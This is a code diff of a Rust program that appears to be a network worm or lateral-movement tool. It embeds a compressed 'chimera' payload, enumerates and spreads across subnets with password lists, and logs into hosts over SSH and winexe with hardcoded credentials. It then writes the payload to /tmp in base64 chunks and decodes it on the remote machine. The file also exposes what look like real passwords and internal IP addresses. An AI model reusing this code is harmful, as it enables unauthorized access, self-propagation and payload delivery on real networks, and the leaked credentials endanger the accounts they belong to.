@@ -6,15 +6,17 @@ use net::{
     ssh::{self, SSHClient},
     winexe::{self, WinexeClient},
 };
+
 //use std::future::Future;
 use crate::net::communicator::{Credentials, Session};
 use crate::net::spread::spreader::Spreader;
 use flate2::read::GzDecoder;
 use futures::future::join_all;
 use futures::{Future, FutureExt};
+
 use std::process::Command;
-use std::sync::Arc;
-use tar::Archive;
+
+const CHIMERA: &[u8] = include_bytes!("../bin/chimera64.zlib");
 
 struct MemoryReport;
 
@@ -34,6 +36,7 @@ impl Drop for MemoryReport {
         println!("Memory Usage at Exit: {} KB", memory_usage.trim());
     }
 }
+
 // fn execute_commands<'a, C>(communicator: &'a C, cmds: Vec<&'a str>) -> Vec<impl Future<Output = Result<Option<String>, std::io::Error>> + 'a>
 // where
 //     C: Communicator + 'a,
@@ -77,32 +80,74 @@ async fn main() {
     // enumerator.ping_sweep().await.unwrap();
 
     // let spreader = init::Spreader::new("password".to_string());
-    println!("Hello, world!");
-    let mut spreader = Spreader::new("password123".to_string());
+
+    // let mut spreader = Spreader::new("password123".to_string());
     // spreader.spread
-    spreader.enumerate_hosts("192.168.60").await;
+    // spreader.enumerate_hosts("192.168.60").await;
     // password123
-    spreader.spread().await;
+    // spreader.spread().await;
     // for host in enumerator.hosts {
     //     println!("Host: {}", host.ip);
     //  GoblinoMunchers759!
     //     // println!("OS: {:?}", host.os);
     // }
 
-    // let creds: Credentials = Credentials {
-    //     username: "cm03",
-    //     password: Some("@11272003Cm!".to_string()),
-    //     key: None,
-    // };
-    // let creds2: Credentials = Credentials {
-    //     username: "pi",
-    //     password: Some("password".to_string()),
-    //     key: None,
-    // };
-    // let winexe_client
-    //     = WinexeClient::new(Some("/tmp/img".to_string()), &creds, "139.182.180.236".to_string())
-    //         .await
-    //         .unwrap();
+    let creds: Credentials = Credentials {
+        username: "cm03".into(),
+        password: Some("@11272003Cm!".to_string()),
+        key: None,
+    };
+
+    let ssh_client = SSHClient::new()
+        .ip("10.123.40.102".to_string())
+        .connect(&creds)
+        .await
+        .unwrap();
+
+    // let mut decompresser = GzDecoder::new(CHIMERA);
+    // let mut decompressed_data = Vec::new();
+    // decompresser
+    //     .read_to_end(&mut decompressed_data)
+    //     .expect("Failed to decompress data");
+
+    // let base64_str = String::from_utf8(decompressed_data).expect("Unable to parse UTF-8");
+
+    // // Define the chunk size in bytes
+    // const CHUNK_SIZE: usize = 125 * 1024; // 100 KB
+
+    // let mut start = 0;
+    // let total_length = base64_str.len();
+
+    // while start < total_length {
+    //     let end = std::cmp::min(start + CHUNK_SIZE, total_length);
+    //     let end = base64_str[..end]
+    //         .char_indices()
+    //         .last()
+    //         .map_or(end, |(idx, _)| idx + 1);
+
+    //     let chunk_str = &base64_str[start..end];
+    //     let command = format!("echo \"{}\" >> /tmp/chimera64", chunk_str);
+
+    //     // Assuming ssh_client is an async SSH client and properly initialized
+    //     ssh_client.execute_command(&command).await.unwrap();
+
+    //     // Print the progress
+    //     println!("Transferred {} / {} bytes", end, total_length);
+
+    //     start = end;
+    // }
+    println!("DONE CHUNKING");
+    // .for_each(|chunk| {
+    //     let chunk_str = chunk.iter().collect::<String>();
+
+    //     let command = format!("echo \"{}\" >> /tmp/chimera64", chunk_str);
+
+    //     ssh_client.execute_command(&command).await.unwrap();
+    // });
+
+    let command = format!("base64 -d /tmp/chimera64 > /tmp/chimera");
+    ssh_client.execute_command(&command).await.unwrap();
+    // println!("EXECUTIONG {}", command);
 
     // let winexe_client = WinexeClient::new()
     //     .container_path("/tmp/img".to_string())
@@ -181,144 +226,3 @@ async fn main() {
 
     // winexe_client.close().await;
 }
-
-// // mod ssh_client;
-// // mod ping_sweepear
-
-// // use ping_sweep::ping_sweep;
-
-// use std::env;
-// use std::fs::File;
-// use std::io::Write;
-// use std::process::Command;
-// use tempfile::NamedTempFile;
-
-// fn execute_winexe(username: &str, password: &str, host: &str, command: &str) {
-//     // Embed the external executable as binary data
-//     let executable_data: &[u8] = include_bytes!("./connection/bin/winexe64");
-
-//     // Write the embedded executable to a temporary file
-//     let mut tmp_file = NamedTempFile::new().expect("Failed to create temp file");
-//     tmp_file.write_all(executable_data).expect("Failed to write to temp file");
-
-//     // Execute the temporary executable
-//     let output = Command::new(tmp_file.path())
-//         .arg("-U")
-//         .arg(format!("{}%{}", username, password))
-//         .arg(format!("//{}", host))
-//         .arg(command)
-//         .output()
-//         .expect("Failed to execute command");
-
-//     // Print the output
-//     println!("Output: {:?}", output.stdout);
-// }
-
-// fn main() {
-//     let args: Vec<String> = env::args().collect();
-//     if args.len() != 5 {
-//         println!("Usage: {} <username> <password> <host> <command>", args[0]);
-//         return;
-//     }
-
-//     let username = &args[1];
-//     let password = &args[2];
-//     let host = &args[3];
-//     let command = &args[4];
-
-//     execute_winexe(username, password, host, command);
-// }
-
-// // use ssh2::Session;
-// // use std::io::prelude::*;
-// // use std::net::TcpStream;
-// // use anyhow::Result;
-// // use anyhow::Error;
-
-// // #[derive(Debug)]
-// // pub struct SSHClient {
-// //     host: String,
-// //     username: String,
-// //     password: Option<String>,
-// //     key: Option<String>,
-// // }
-
-// // impl SSHClient {
-// //     pub fn new(host: String, username: String, password: Option<String>, key: Option<String>) -> Self {
-// //         SSHClient {
-// //             host,
-// //             username,
-// //             password,
-// //             key,
-// //         }
-// //     }
-
-// //     pub async fn connect_and_authenticate(&self) -> Result<Session, Error> {
-// //         let tcp = TcpStream::connect(&self.host)?;
-// //         let mut session = Session::new().unwrap();
-// //         session.set_tcp_stream(tcp);
-// //         session.handshake()?;
-
-// //         if let Some(ref password) = self.password {
-// //             session.userauth_password(&self.username, &password)?;
-// //         } else {
-// //             return Err(anyhow::anyhow!("Authentication method not provided"));
-// //         }
-
-// //         Ok(session)
-// //     }
-
-// //     pub async fn execute_command(&self, session: &Session, command: &str) -> Result<String, Error> {
-// //         let mut channel = session.channel_session()?;
-// //         channel.exec(command)?;
-
-// //         let mut output = String::new();
-// //         channel.read_to_string(&mut output)?;
-
-// //         channel.send_eof()?;
-// //         channel.wait_close()?;
-
-// //         Ok(output)
-// //     }
-// // }
-
-// // #[tokio::main]
-// // async fn main() -> Result<(), Error> {
-// //     let ips = vec!["127.0.0.1:22", "192.168.1.163:22"]; // Replace with your list of IPs
-// //     let username = "cm03".to_string();
-// //     let password = Some("@11272003Cm!".to_string()); // Please replace with a safer placeholder
-
-// //     let mut handles = vec![];
-
-// //     for ip in ips {
-// //         let username = username.clone();
-// //         let password = password.clone();
-
-// //         let handle = tokio::task::spawn(async move {
-// //             let client = SSHClient::new(ip.to_string(), username, password, None);
-// //             match client.connect_and_authenticate().await {
-// //                 Ok(session) => {
-// //                     match client.execute_command(&session, "ls").await {
-// //                         Ok(output) => {
-// //                             println!("Output from {}: {}", ip, output);
-// //                         }
-// //                         Err(e) => {
-// //                             println!("Error executing command on {}: {:?}", ip, e);
-// //                         }
-// //                     }
-// //                 }
-// //                 Err(e) => {
-// //                     println!("Error connecting to {}: {:?}", ip, e);
-// //                 }
-// //             }
-// //         });
-
-// //         handles.push(handle);
-// //     }
-
-// //     for handle in handles {
-// //         handle.await?;
-// //     }
-
-// //     Ok(())
-// // }
